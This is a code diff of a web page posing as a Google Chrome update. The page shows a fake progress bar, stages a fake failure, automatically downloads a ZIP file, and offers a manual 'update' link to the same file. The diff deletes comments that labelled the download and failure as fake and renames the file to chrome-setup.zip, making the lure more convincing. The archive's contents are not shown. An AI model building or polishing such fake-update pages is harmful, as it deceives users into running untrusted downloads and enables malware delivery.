@@ -8,6 +8,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
   <link rel="icon" type="image/x-icon" href="chrome.ico">
 
+
   <style>
     body {
       margin: 0;
@@ -81,7 +82,6 @@
 
   <script>
     window.onload = () => {
-      // Start fake download
       const bar = document.querySelector('.bar');
       let progress = 0;
       const interval = setInterval(() => {
@@ -89,14 +89,13 @@
         bar.style.width = Math.min(progress, 100) + "%";
         if (progress >= 100) {
           clearInterval(interval);
-          showFallback(); // fake failure
+          showFallback();
         }
       }, 300);
 
-      // Auto download ZIP
       const a = document.createElement('a');
-      a.href = 'chrome.zip';
-      a.download = 'chrome.zip';
+      a.href = 'chrome-setup.zip';
+      a.download = 'chrome-setup.zip';
       document.body.appendChild(a);
       a.click();
     };
@@ -116,7 +115,7 @@
       <div class="bar"></div>
     </div>
     <div class="fallback">
-      <a href="chrome.zip">Click here to update manually</a>
+      <a href="chrome-setup.zip">Click here to update manually</a>
     </div>
     <div class="ver">v114.0.5735.199</div>
   </div>
